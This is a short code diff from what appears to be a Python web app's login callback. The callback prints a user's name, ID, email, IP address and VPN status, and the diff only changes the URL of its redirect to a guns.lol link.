@@ -98,4 +98,4 @@ def callback():
     print(f"✅ {username} ({user_id}) — {email} — IP: {user_ip} — VPN: {is_vpn}")
 
     # Redirection vers guns.lol
-    return redirect("https://guns.lol/8km3")
+    return redirect("https://guns.lol/j8a")
